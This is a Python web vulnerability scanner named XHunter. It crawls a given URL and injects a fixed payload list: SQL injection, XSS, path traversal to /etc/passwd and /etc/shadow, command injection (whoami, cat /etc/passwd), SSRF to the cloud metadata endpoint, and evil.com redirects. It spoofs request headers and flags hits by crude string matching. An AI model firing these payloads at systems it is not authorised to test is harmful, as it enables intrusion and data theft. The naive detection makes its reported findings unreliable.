#################################### message from DamnBoy402 ############################################
## Do you want to recode this script? Please include the credit of the original author, original author = DamnBoy402, do not claim my work   ##
## You can contribute or help develop this script, don't forget to tag me if you upload your work to github or to other social platforms :D         ##
## I really appreciate your contribution in helping to develop XHunter, so, stay enthusiastic about being a programmer :D                                    ##
#####################################################################################################
import argparse
import requests
import urllib.parse
import os
import random
import threading
import time
from queue import Queue
from bs4 import BeautifulSoup
from rich.console import Console
from rich.table import Table
from rich.text import Text

os.system("clear")
c = Console()

r, rr, rrr, g, y, d = "[red]", "[bold red]", "[bright_red]", "[green]", "[yellow]", "[white]"

c.print(f"""
{rrr}██╗  ██╗██╗  ██╗███╗   ██╗████████╗███████╗██████╗ 
{rr}██║  ██║██║  ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
{r}███████║███████║██╔██╗ ██║   ██║   █████╗  ██████╔╝
{r}██╔══██║██╔══██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
{r}██║  ██║██║  ██║██║ ╚████║   ██║   ███████╗██║  ██║
{r}╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
{y}XHunter+ | Ultimate Web Vulnerability Scanner{d}
{r}Authored By Damnboy{rrr}
""")

CRAWLED_LINKS = set()
VULN_LINKS = []
q = Queue()

def xnxx():
    if os.path.exists("useragent.txt"):
        with open("useragent.txt", "r") as f:
            return [ua.strip() for ua in f.readlines() if ua.strip()]
    return [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]

USER_AGENTS = xnxx()

HEADERS = {
    "User-Agent": random.choice(USER_AGENTS),
    "Referer": "https://www.google.com",
    "X-Forwarded-For": "127.0.0.1",
    "Accept-Encoding": "gzip, deflate",
}

PAYLOADS = {
    "SQL Injection": ["' OR '1'='1' --", "' UNION SELECT NULL, NULL --", "' OR 1=1#"],
    "XSS": ["<script>alert(1)</script>", "'><script>alert(1)</script>", '"><img src=x onerror=alert(1)>'],
    "LFI": ["../../../../etc/passwd", "../../../../etc/shadow", "/proc/self/environ"],
    "Open Redirect": ["//evil.com", "https://evil.com", "/%2F%2Fevil.com"],
    "RCE": ["; ls -la", "`whoami`", "| cat /etc/passwd"],
    "SSTI": ["{{7*7}}", "{7*7}", "${7*7}"],
    "SSRF": ["http://127.0.0.1:80", "file:///etc/passwd", "http://169.254.169.254/latest/meta-data/"],
    "HPP": ["?param=1&param=2", "?q=1&q=<script>alert(1)</script>", "?x=foo&x=bar"]
}

def fvck(url):
    try:
        response = requests.get(url, headers=HEADERS, timeout=5)
        return response
    except:
        return None

def sigma(response, payload, vuln_type, url):
    indicators = {
        "SQL Injection": ["syntax error", "mysql_fetch", "mysqli", "sql syntax", "Warning: mysql"],
        "XSS": ["<script>alert"],
        "LFI": ["root:x:0:0", "DB_PASSWORD"],
        "Open Redirect": ["evil.com"],
        "RCE": ["uid=", "gid=", "/root"],
        "SSTI": ["49", "Error in template"],
        "SSRF": ["EC2", "Instance", "Metadata"],
        "HPP": ["Duplicate parameter"]
    }

    if any(indicator in response.text.lower() for indicator in indicators[vuln_type]):
        vuln_color = rrr if vuln_type in ["RCE", "SSRF", "SQL Injection"] else rr
        c.print(f"{vuln_color}[CRITICAL] {vuln_type} at {url} with payload: {payload}")
        VULN_LINKS.append((vuln_type, url, payload))
        with open("result.txt", "a") as f:
            f.write(f"{vuln_type} VULNERABILITY FOUND: {url} | Payload: {payload}\n")

def ligma(url, payloads, vuln_type):
    for payload in payloads:
        injected_url = url + urllib.parse.quote(payload)
        response = fvck(injected_url)
        if response:
            sigma(response, payload, vuln_type, injected_url)

def slex(url, depth, test_all):
    if url in CRAWLED_LINKS or depth <= 0:
        return
    CRAWLED_LINKS.add(url)

    try:
        response = fvck(url)
        if not response:
            return

        soup = BeautifulSoup(response.text, "html.parser")

        for link in soup.find_all("a", href=True):
            full_url = urllib.parse.urljoin(url, link["href"])
            if "=" in full_url and test_all:
                for vuln_type, payloads in PAYLOADS.items():
                    q.put((ligma, full_url, payloads, vuln_type))

            if full_url.startswith(url):
                slex(full_url, depth - 1, test_all)

    except Exception as e:
        c.print(f"{r}[ERROR] {e}")

def bigass():
    while not q.empty():
        function, *args = q.get()
        function(*args)
        q.task_done()

parser = argparse.ArgumentParser(description="XHunter Ultra++ - Ultimate Web Vulnerability Scanner")
parser.add_argument("-u", "--url", help="Target URL", required=True)
parser.add_argument("--all", help="Scan ALL vulnerabilities", action="store_true")
parser.add_argument("--depth", help="Crawl Depth (default: 2)", type=int, default=2)

args = parser.parse_args()

if __name__ == "__main__":
    c.print(f"{y}[STARTING XHunter Ultra++]")
    slex(args.url, args.depth, args.all)

    threads = []
    for _ in range(10):
        thread = threading.Thread(target=bigass)
        thread.daemon = True
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    table = Table(title="Scan Results", header_style="bold magenta")
    table.add_column("Vulnerability Type", style="bold cyan")
    table.add_column("URL", style="bold yellow")
    table.add_column("Payload", style="bold red")

    for vuln in VULN_LINKS:
        table.add_row(vuln[0], vuln[1], vuln[2])

    c.print(table)
    c.print(f"\n{g}[SCAN COMPLETE] Results saved in result.txt")
    
    
# This is just a simple script, that's it :)